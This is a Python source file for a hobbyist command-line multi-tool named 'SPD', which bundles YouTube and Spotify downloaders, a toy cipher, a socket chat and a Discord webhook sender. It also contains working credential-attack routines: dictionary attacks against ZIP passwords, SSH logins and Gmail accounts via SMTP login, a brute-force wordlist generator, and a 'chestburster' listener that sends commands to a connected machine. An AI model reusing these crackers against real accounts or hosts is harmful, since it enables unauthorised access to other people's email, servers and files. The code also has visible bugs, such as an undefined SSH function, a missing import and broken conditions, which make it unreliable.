import os
import time
from art import tprint
import colored
from colored import stylize
import time
import getpass
system_print = colored.fg("red") + colored.attr("bold")
kinda_normal_printsystem = colored.fg("dodger_blue_2")
def printsystem(texttoprint):
    print(stylize(texttoprint,system_print))
def inputsystem(inputtoinput):
    return input(stylize(inputtoinput,system_print))
import os
def clear(): 
    os.system('cls') #on Windows System
import os
cmd = 'color 0F'
os.system(cmd)
import art
spd_print = colored.fg("red") + colored.attr("bold")
art.tprint("SPD")
time.sleep(2)
username = 'mango'
key = 'password'
enckey = "BA29995765683801FFAA4E4D1089D6F3418D85DAF44E02A62F78726F27A3F39139B60EB93D12491A0D84C1212715C2904439A022950A4837314F5FB3A7227CBB"
inputsystem_username = inputsystem("[+]Enter username: \r\n")
# inputsystem_key = inputsystem("\r\n[+]Enter secret key: \r\n")
clear()
inputsystem_key = getpass.getpass(stylize("\r\n[+]Enter secret key: \r\n",system_print))
if inputsystem_username == username and inputsystem_key == key:
    printsystem("\r\n[+]Authentication successful.")
    printsystem("[+]Initiating system...")
    import datetime
    import webbrowser
    from itertools import combinations_with_replacement
    import itertools
    from art import tprint
    import sys
    from bs4 import BeautifulSoup
    import requests
    import pafy
    from pytube import YouTube
    import pytube
    import time
    commandrequest = ''
    YoutubeVideoURLs = []
    YoutubeAudioURLs = []
    def downloadfromfile(filepath):

            import subprocess
            process = subprocess.Popen(['spotdl', '--list', filepath], 
                                    stdout=subprocess.PIPE,
                                    universal_newlines=True)

            while True:
                output = process.stdout.readline()
                printsystem(output.strip())
                # Do something else
                return_code = process.poll()
                if return_code is not None:
                    # Process has finished, read rest of the output 
                    printsystem("\r\n[+]All songs downloaded.")
                    break
    def songdownload(songlink):

        import subprocess
        process = subprocess.Popen(['spotdl', '--song', songlink], 
                                stdout=subprocess.PIPE,
                                universal_newlines=True)

        while True:
            output = process.stdout.readline()
            printsystem(output.strip())
            # Do something else
            return_code = process.poll()
            if return_code is not None:
                # Process has finished, read rest of the output 
                printsystem("\r\n[+]Song downloaded.")
                break
    def ado_dwnldr(url): #Tries to download the audio from the URL, and if it can't, it lets the user know it
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}

        try:
            result = pafy.new(url,headers)
            best_quality_audio = result.getbestaudio()    
            best_quality_audio.download()
            printsystem('\r\n[+]Audio downloaded.')
        except:
            printsystem('\r\n[-]Audio is not available.')
    def vdo_dwnldr(url): #Downloads the video at the highest available resolution
        printsystem("\r\n[+]Video download process initiated")
        yt = pytube.YouTube(url)
        stream = yt.streams.get_highest_resolution()
        stream.download()
        printsystem('[+]Video downloaded.')
    def main(): #asks the audio or video URL and checks to see if it's compatible with the module
        videolink = inputsystem('\r\n[+]Enter the video or audio URL: ')
        if "https://www.youtube.com/watch?v" in videolink:
            s_case = int(inputsystem('[+]Choose between: \r\n -1.Audio format\r\n -2.Video format\r\n  Choice: '))

            if s_case == 1:
                ado_dwnldr(videolink)
            elif s_case == 2:
                vdo_dwnldr(videolink)
            else:
                print(stylize(str("[-]Invalid inputsystem :", s_case,". Please try again."),system_print))
        else:
            print(stylize(str('[-]Unkown Youtube URL :', "'",videolink,"'"),system_print))
    def decrypt(): #decrypt(no explanation)
        import random
        result = ''
        message = ''
        characters_in_order = [chr(x) for x in range(16, 128)]
        message = inputsystem('\r\n[+]Enter string to decrypt: ')

        r_seed = inputsystem('[+]Enter an encryption key (should be the same one used to encrypt): ')
        random.seed(r_seed)
        shuffled_list = [chr(x) for x in range(16, 128)]
        random.shuffle(shuffled_list)

        for i in range(0, len(message)):
            result += characters_in_order[shuffled_list.index(message[i])]
        toprint = "[+]Decrypted string: " + result
        printsystem(toprint)
        
        import pyperclip
        pyperclip.copy(result)
        printsystem("[+]String copied to clipboard.")
        result = ''
    def help(): #printsystems all the available commands
        printsystem("\r\n[+]All available commands : \r\n/encrypt,decrypt,help,wifi,bruteforce(Heavy WIP)\r\nlife,time,search,youtube.download(),file.convert()\r\nexit,list.audio.download(),list.video.download(),list.video.add(<url>),list.audio.add(<url>)\r\nlist.video,list.audio,youtube.get_video_title,youtube.download.audio(<youtube URL>),youtube.download.video(<youtube URL>)\r\nspotify.download.song(<song link>),spotify.download.playlist(<playlist link>),spotify.download.fromfile(<file path>),esc.launch(),discord.send()\r\nzip.crack(),ssh.crack(),gmail.crack()")
    def encrypt(): # encrypt(no explanation either)
        import random
        result = ''
        message = ''
        characters_in_order = [chr(x) for x in range(16, 128)]
        message = inputsystem('\r\n[+]Enter string for encryption: ')
        r_seed = inputsystem('[+]Enter an encryption key: ')
        random.seed(r_seed)
        shuffled_list = [chr(x) for x in range(16, 128)]
        random.shuffle(shuffled_list)
        for i in range(0, len(message)):
            result += shuffled_list[characters_in_order.index(message[i])]
        toprint = "[+]Encrypted string: " + result
        printsystem(toprint)
        import pyperclip
        pyperclip.copy(result)
        printsystem("[+]String copied to clipboard.")
        result = ''
    def bruteforce(charset,length,maxcounter,dictionary): #too long algorithm to explain
        generator = itertools.combinations_with_replacement(charset, length)
        start = time.time()
        counter = 0
        def convertTuple(tup): 
            str =  ''.join(tup) 
            return str

        if dictionary == True:
            dictionaryfile = open("dictionary.txt","wb")
            for password in generator:
                if counter <= maxcounter:
                    password = convertTuple(password)
                    password = password + "\r\n"
                    dictionaryfile.write(bytes(password.encode()))
                    toprint = "[", counter, "]", password, "|", time.time()-start
                    printsystem(toprint)
                    counter = counter+1
                else:
                    exit
                    # printsystem("Finshed brute-forcing | Total attempts : ", counter, " | Elapsed time : ", time.time())
                    #To get all the possible letters of the alphabet with a length of 5, use : bruteforce('abcdefghijklmnoprsqtuvwxyz',5,240000)

        elif dictionary == False:

            for password in generator:
                if counter <= maxcounter:
                    password = convertTuple(password)
                    printsystem("[", counter, "]", password, "|", time.time()-start)
                    counter = counter+1
                else:
                    exit
                    # printsystem("Finshed brute-forcing | Total attempts : ", counter, " | Elapsed time : ", time.time())
                    #To get all the possible letters of the alphabet with a length of 5, use : bruteforce('abcdefghijklmnoprsqtuvwxyz',5,240000)
    def lifeanswer(): #42
        printsystem("[+-]The answer to the ultimate question of life, the universe, and everything is 42")
    def convert(): #basically converts files using the 'os' module
        import os
        convertpath = inputsystem("[+]Enter the file path: ")
        import os.path
        extension = os.path.splitext(convertpath)[1]
        base = os.path.splitext(convertpath)[0]
        if os.path.isfile(convertpath) == True:
            destformat = inputsystem("[+]Enter the destination file format('.' included): ")
            if extension == '.mp3' or '.wav' or '.webm' or '.ogg' or '.raw':

                if destformat == '.mp3':
                    os.rename(convertpath, base + '.mp3')
                    printsystem("[+]Successfully converted")
                if destformat == '.wav':
                    os.rename(convertpath, base + '.wav')
                    printsystem("[+]Successfully converted")
                if destformat == '.webm':
                    os.rename(convertpath, base + '.webm')
                    printsystem("[+]Successfully converted")
                if destformat == '.ogg':
                    os.rename(convertpath, base + '.ogg')
                    printsystem("[+]Successfully converted")
                if destformat == '.raw':
                    os.rename(convertpath, base + '.raw')
                    printsystem("[+]Successfully converted")
                else:
                    printsystem("")
            else:
                printsystem("[-]The file you provided cannot be converted.")
    def launchetps():
        from art import tprint

        import sys
        import socket
        import time
        tprint("\r\nE P T S - Enhanced Privacy Talk System")
        printsystem("")
        time.sleep(2)

        choice = inputsystem("[+]Do you want to : \r\n-1. Host an EPTS server \r\n-2. Connect to an EPTS server\r\n>> ")
        if choice == '1':
            ## Init ## 
            socketmodule = socket.socket()
            host = socket.gethostname()
            printsystem("[+]EPTS server will start on host: ", host)
            port = int(inputsystem("[+]Enter the port you want to host the server on: "))
            # enckey = inputsystem("Enter the encryption key for the messages : ")
            socketmodule.bind((host,port))
            printsystem("[+]EPTS server binded to host and port.")
            socketmodule.listen(int(inputsystem("[+]Maximum amount of connections to the server: ")))
            conn, addr = socketmodule.accept()
            print(stylize(str("[+]",addr, "has connected to the server and is now online."),system_print))
            printsystem("[+]Waiting for people to connect...")
            while True:

                message = inputsystem(str(">> "))
                message = (socket.gethostname() + " : " + message).encode()
                conn.send(encrypt(message,enckey))
                conn.send(message)
                printsystem("[+]Message sent.")
                printsystem("")
                incmessage = conn.recv(2048)
                incmessage = incmessage.decode()
                printsystem(decrypt(incmessage,enckey))
                printsystem("")
        elif choice == 2:

            ## Init ## 
            socketmodule = socket.socket()
            host = inputsystem(str("[+]Enter server hostname : "))
            port = int(inputsystem("[+]Enter the server port : "))
            socketmodule.connect((host,port))
            print(stylize(str("[+]Connected to the EPTS server using port", port),system_print))
            while True:
                    
                incmessage = socketmodule.recv(2048)
                incmessage = incmessage.decode()
                # printsystem(decrypt(incmessage,enckey))
                printsystem(incmessage)
                printsystem("")
                message = inputsystem(str(">> "))
                message = (socket.gethostname() + " : " + message).encode()
                # socketmodule.send(encrypt(message,enckey))
                socketmodule.send(message)
                printsystem("[+]Message sent.")
    def sendembed(webhookurl,content,title,description,url,author):
        import json
        from urllib import request
        from urllib.error import HTTPError
        str(webhookurl,content,title,description,url,author)

        WEBHOOK_URL = webhookurl

        payload = {
            'content': content,
            'embeds': [
                {
                    'title': title,
                    'description': description,
                    'url': url,
                    'author': {'name': author},
                },
            ]
        }

        headers = {
            'Content-Type': 'application/json',
            'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
        }

        req = request.Request(url=WEBHOOK_URL,
                            data=json.dumps(payload).encode('utf-8'),
                            headers=headers,
                            method='POST')

        try:
            response = request.urlopen(req)
            printsystem(response.status)
            printsystem(response.reason)
            printsystem(response.headers)
        except HTTPError as e:
            printsystem('[-]ERROR')
            printsystem(e.reason)
            printsystem(e.hdrs)
            printsystem(e.file.read())
    def crack_zip():
        import zipfile
        import os
        from colored import fg, bg, attr

        green = fg("green")
        red = fg("red")

        zipName = input("[*] Zip: ")
        pwdsFile = input("[*] Dictionary File: ")

        if os.path.exists(zipName):
            if os.path.exists(pwdsFile):
                with open(pwdsFile,'rb') as text:
                    for entry in text.readlines():
                        password = entry.strip()
                        with zipfile.ZipFile(zipName,'r') as zf:
                            try:
                                zf.extractall(pwd=password)

                                print( green + "\n[+] Password Found!\n" + attr("reset"))

                                data = zf.namelist()[0]
                                print("Data: " + str(data))

                                data_size = zf.getinfo(data).file_size
                                print("Data Size: " + str(data_size))

                                print("Password: " + password.decode("utf-8"))

                                break
                            except:
                                print(red + "[-] Password Not Found! - " + password.decode("utf-8"))
                            pass
            else:
                print(red + "[-] Password File Not Found!")
        else:
            print(red + "[-] Zip File Not Found!")


        inputsystem()

    count = 1
    def connectSSH(hostname, port, username, passFile):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        with open(passFile, "r") as f:
            global count
            for password in f.readlines():
                password = password.strip()
                try:
                    client.connect(hostname, port=port, username=username, password=password)
                    print(stylize(str("[" + str(count) + "] " + "[+] Password Success ~ " + password),system_print))
                    print(stylize(str("*" * 50),system_print))
                    print(stylize(str("[+]HostName: " + hostname),system_print))
                    print(stylize(str("[+]UserName: " + username),system_print))
                    print(stylize(str("[+]Password: " + password),system_print))
                    print(stylize(str("*" * 50),system_print))
                    break
                except:
                    print(stylize(str("[" + str(count) + "] " + "[-] Password Failed ~ " + password),system_print))
                    count += 1

        hostname = inputsystem("[*] Enter HostName: ")
        username = inputsystem("[*] Enter UserName: ")
        passwordFile = inputsystem("[*] Enter Dictionary File: ")

        connectSSH(hostname, 22, username, passwordFile)
    def crack_gmail():
        import smtplib
        import os
        from colored import fg, attr

        green = fg("green")
        red = fg("red")
        reset = attr("reset")

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        victim_email = inputsystem("[*] Enter Email: ")


        is_valid = True

        if is_valid == True:
            file_path = inputsystem("[*] Enter Dictionary File: ")
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    for password in f:
                        try:
                            server.login(victim_email, password)
                        except:
                            printsystem(red + "[-] Password Not Found! ->", password)
                        else:
                            printsystem(green + "\n[+] Password Found!" + reset)
                            printsystem("Email: " + victim_email)
                            printsystem("Password: " + password.strip())
                            break
            else:
                printsystem(red + "[-] File Not Found!")
        else:
            printsystem("[-] Gmail Not Found!")

        inputsystem()
    def playlistdownload(playlistlink):
        import subprocess
        process = subprocess.Popen(['spotdl', '--playlist', playlistlink], 
                                stdout=subprocess.PIPE,
                                universal_newlines=True)

        while True:
            output = process.stdout.readline()
            print(output.strip())
            # Do something else
            return_code = process.poll()
            if return_code is not None:
                # Process has finished, read rest of the output 
                print("[+]Now you should see a .txt file with the name of your playlist containing all the songs of your playlist.\r\nNow you just need to enter : \r\nspotify.download.fromfile(<name of the text file and path if not in the same directory).")
                break
    while True:
        commandrequest = inputsystem('>> ')
        if "encrypt" in commandrequest:
            encrypt()      

        if "decrypt" in commandrequest:
            decrypt()

        if "help" in commandrequest:
            help()

        if "wifi.crack" in commandrequest:
            printsystem("\r\n[+]ERROR: STILL WIP")

        if "bruteforce" in commandrequest:
            chars = inputsystem("\r\n[+]Enter the desired charset in the brute-force: ")
            charslength = int(inputsystem("[+]Enter the charset's length: "))
            maximcounter = int(inputsystem("[+]Enter the maximum amount of tries: "))
            dictionary = inputsystem("[+]Create a dictionary? Y/N: ")
            if dictionary == 'Y' or 'Yes' or 'YES':
                bruteforce(chars,charslength,maximcounter, True)
            else:
                if dictionary == 'N' or 'No' or 'NO':
                    bruteforce(chars,charslength,maximcounter, False)
            
        if "life" in commandrequest:
            if "universe" in commandrequest:
                if "answer" in commandrequest:
                    lifeanswer()

        if 'time' in commandrequest:
            strTime=datetime.datetime.now().strftime("%H:%M:%S")
            printsystem(f"\r\n[+]Current date: {strTime}")

        if 'search' in commandrequest:
            if '(' in commandrequest:
                if ")" in commandrequest:
                    commandrequest = commandrequest.replace("(", "")
                    commandrequest = commandrequest.replace(")", "")
                    commandrequest = commandrequest.replace("search", "")
                    commandrequest = "https://www.google.com/search?client=firefox-b-d&q=" + commandrequest.replace("%", "+")
                    webbrowser.open_new_tab(commandrequest)

        if 'youtube.download()' == commandrequest:
            if not 'list' in commandrequest:
                main()

        if 'file.convert()' == commandrequest:
            c_case = int(inputsystem("\r\n[+]Choose between:\r\n 1.Audio conversion\r\n 2.Video conversion\r\n    Choice: "))
            if c_case == 1:
                convert()
            elif c_case == 2:
                def converter(file,output):
                    return open(output, "wb").write(open(file, "rb").read())
                converter(inputsystem("[+]Enter the file path: "),inputsystem("[+]Enter the output path: "))
            else:
                printsystem("[+]Invalid input :", c_case,". Please try again.")

        if 'exit' in commandrequest:
            e_case = inputsystem("\r\n[+]Confirm exit(Y/N).")
            if 'Y' in e_case:
                printsystem("[+]Exit confirmed.")
                exit
                sys.exit()
            elif 'N' in e_case:
                printsystem("[+]Exit canceled.")
            else:
                printsystem("[+]Invalid inputsystem :", e_case,". Please try again.")

        if 'list.audio.download()' == commandrequest:


            printsystem("\r\n[+]Download process initiated.")
            counter = 0
            for urlaudioyt in YoutubeAudioURLs:

                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}
                try:
                    result = pafy.new(urlaudioyt,headers)
                    best_quality_audio = result.getbestaudio()    
                    best_quality_audio.download()
                    counter = counter + 1
                    print(stylize(str("[+]Audio n.",counter," downloaded."),system_print))
                except:
                    print(stylize(str('[+]Audio n.',counter," could not be downloaded."),system_print))

        if 'list.video.download()' in commandrequest:
            printsystem("\r\n[+]Download process initiated.")
            counter = 0
            for urlyt in YoutubeVideoURLs:
                yt = pytube.YouTube(urlyt)
                stream = yt.streams.get_highest_resolution()
                stream.download()
                counter = counter + 1
                currentvideo = YouTube(urlyt)
                printsystem(stylize(str("[+]Downloaded video n.",counter,"->", currentvideo.title+"."),system_print))

        if 'list.video.add' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("list.video.add", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                YoutubeVideoURLs.append(commandrequest)
                printsystem("\r\n[+]Video element added.")

        if 'list.audio.add' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("list.audio.add", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                YoutubeAudioURLs.append(commandrequest)
                printsystem("\r\n[+]Audio element added.")

            else:
                print(stylize(str("\r\n[+]Unkown command :", commandrequest,". Please try again."),printsystem))

        if 'list.video' == commandrequest:
                printsystem(YoutubeVideoURLs)

        if 'list.audio' == commandrequest:
                printsystem(YoutubeVideoURLs)

        if 'youtube.get_video_title' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("youtube.get_video_title", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                videotogettitle = YouTube(commandrequest)
                print(stylize(str("\r\n[+]Video title :", videotogettitle.title),system_print))
        
        if 'youtube.download.audio' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("youtube.download.audio", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                ado_dwnldr(commandrequest)

        if 'youtube.download.video' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("youtube.download.video", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                vdo_dwnldr(commandrequest)

        if 'spotify.download.song' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("spotify.download.song", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                songdownload(commandrequest)

        if 'spotify.download.playlist' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("spotify.download.playlist", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                playlistdownload(commandrequest)

        if 'spotify.download.fromfile' in commandrequest:
            if '(' and ")" in commandrequest:
                commandrequest = commandrequest.replace("spotify.download.fromfile", "")
                commandrequest = commandrequest.replace("(", "")
                commandrequest = commandrequest.replace(")", "")
                downloadfromfile(commandrequest)

        if 'esc.launch()' == commandrequest:
            launchetps()

        if 'discord.send()' == commandrequest:
            sendembed(inputsystem("\r\n[+]Enter the webhook URL: "),inputsystem("[+]Enter the content: "),inputsystem("[+]Enter the title: "),inputsystem("[+]Enter the description: "),inputsystem("[+]Enter the URL: "),inputsystem("[+]Enter the author name: "))

        if 'zip.crack()' == commandrequest:
            crack_zip()

        if 'ssh.crack()' == commandrequest:
            crack_ssh()

        if 'gmail.crack()' == commandrequest:
            crack_gmail()

        if 'chestburster.launch()' == commandrequest:
            import time
            import sys
            import socket
            import os
            s = socket.socket()
            host = socket.gethostname()
            print(host)
            port = 8080
            s.bind((host,port))
            print("")
            print("Waiting for incoming connection")
            print("")
            s.listen(1)
            conn, addr = s.accept()
            print("")
            print("addr","  - Has connected")
            print("")
            command = input(str(">>"))
            conn.send(command.encode(encoding='UTF-8'))
            print("Command has been sent. Waiting for confirmation")
            print("")
            data = conn.recv(1024)
            if data:
                print("Shutdown command has been received and executed")
                print("")

        else:
            printsystem("")
else:
    printsystem("\r\n[-]Wrong username or key. Exiting...")
    import sys
    sys.exit()